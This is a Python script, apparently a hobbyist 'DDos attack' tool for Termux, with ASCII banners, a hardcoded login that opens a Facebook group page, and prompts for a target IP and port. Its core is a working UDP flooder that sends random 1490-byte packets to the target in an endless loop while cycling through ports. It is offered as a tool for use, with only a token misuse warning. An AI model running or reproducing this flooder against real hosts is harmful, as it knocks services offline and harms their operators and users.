import sys
import os
import time
import socket
import random

def logopsb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.003)

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


import os
import time
import sys
import random


#text colour()

white = '\33[90m'
red = '\33[91m'
green = '\33[92m'
yollow = '\33[93m'
blue = '\33[94m'
rosy = '\33[95m'
pest = '\33[96m'
blue = '\x1b[94m'
lightblue = '\x1b[94m'
red = '\x1b[91m'
white = '\x1b[97m'
green = '\x1b[93m'
green = '\x1b[1;32m'
cyan = '\x1b[96m'
end = '\x1b[0m'
yellow = '\n\n\x1b[1;93m'

#colour end

os.system("clear")
import os,sys,time,random
print("")
print("")
color = ["\033[1;31m","\033[1;32m","\033[0;34m","\033[0;35m","\033[0;36m",]
m = random.choice(color)+("""
 _       __     __                             
| |     / /__  / /________  ____ ___  ___      
| | /| / / _ \/ / ___/ __ \/ __ `__ \/ _ \     
| |/ |/ /  __/ / /__/ /_/ / / / / / /  __/     
|__/|__/\___/_/\___/\____/_/ /_/ /_/\___/      
      / /_____                                 
     / __/ __ \                                
    / /_/ /_/ /                                
    \__/\____/__ ___  __  __                   
           / __ `__ \/ / / /                   
          / / / / / / /_/ /                    
         /_/ /_/ /_/\__, /                     
   __              /____/                      
  / /_____  ____  / /                          
 / __/ __ \/ __ \/ /                           
/ /_/ /_/ / /_/ / /                            
\__/\____/\____/_/                             
                                               
                                               """)
for msg in m:
    sys.stdout.write(msg)
    sys.stdout.flush()
    time.sleep(0.01)
print("")
psb("\n\n[!] Loading...")
time.sleep(0.10)
psb("\n[!] Please Wait......")
time.sleep(2)





os.system("clear")
logo1=(yellow+"""
    ____  __           __                 
   / __ )/ /___ ______/ /__               
  / __  / / __ `/ ___/ //_/               
 / /_/ / / /_/ / /__/ ,<                  
/_____/_/\__,_/\___/_/|_|                 
           __               __            
          / /_  ____ ______/ /_____  _____
         / __ \/ __ `/ ___/ //_/ _ \/ ___/
        / / / / /_/ / /__/ ,< /  __/ /    
       /_/ /_/\__,_/\___/_/|_|\___/_/     
                                          
""")


abdullah=(green+"\n★★★★★★★★★★★★★★")+(blue+" Delovement by MD Abdullah ")+(green+"★★★★★★★★★★★★")



#download package





print(logo1)
print(abdullah)
x=3
while x<5:
     user=str(input(pest+"\n USERNAME :"))
     passw=str(input(pest+"\n PASSWORD :"))
     if user=="Abdullah" and passw=="Abdullah":
      print(green+"\n\t\tLogin Succcessfull ✔️✔️")
      sys.stdout.flush()
      time.sleep(5) 
      os.system("xdg-open https://facebook.com/groups/superbipap/")
      x=8
     else:
      	print(green+"\n\tusername or password incorrect⚠️ ⚠️")
      	os.system("xdg-open https://facebook.com/groups/superbipap/")
      	x=3




os.system("clear")
time.sleep(1)
print ("\033[92m")
print(green+"""

    ____  __           __                 
   / __ )/ /___ ______/ /__               
  / __  / / __ `/ ___/ //_/               
 / /_/ / / /_/ / /__/ ,<                  
/_____/_/\__,_/\___/_/|_|                 
           __               __            
          / /_  ____ ______/ /_____  _____
         / __ \/ __ `/ ___/ //_/ _ \/ ___/
        / / / / /_/ / /__/ ,< /  __/ /    
       /_/ /_/\__,_/\___/_/|_|\___/_/     
                                          
""")
print()
time.sleep(0.15)
psb("\n\n[!] Loading...")
time.sleep(0.10)
psb("\n[!] Please Wait.....")
time.sleep(2)



print("\033[0;92m")
os.system("clear")
time.sleep(0.5)
logopsb(logo1+end)

time.sleep(0.6)
green = '\33[92m'
pest = '\33[96m'
end = '\x1b[0m'
print("""
   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓""")

print(green+"    Author       : Md Abdullah  ")                   	
print("    Tool         : DDos attack &  web ip finder   ") 
print("    Version      : 2.0       ")                             
print("    Fb group     : Super bipap team ")
print("                   : Termux hacking & basic bd✅ ")     
print("    Warrning     : Do no miss use ⚠️ ⚠️"+end)
print("""   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


""")

print
print("\033[92m")
ip = input("[!] Target IP : ")
port = int(input("[!] Port      : "))

os.system("clear")
os.system("figlet DDos-Attack")
print("			")
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     sent2 = str(sent)
     port2 = str(port)
     print("Sent "+sent2+" packet to "+ip+" throught port:"+port2)
     if port == 65534:
       port = 1
print("\033[0;40m")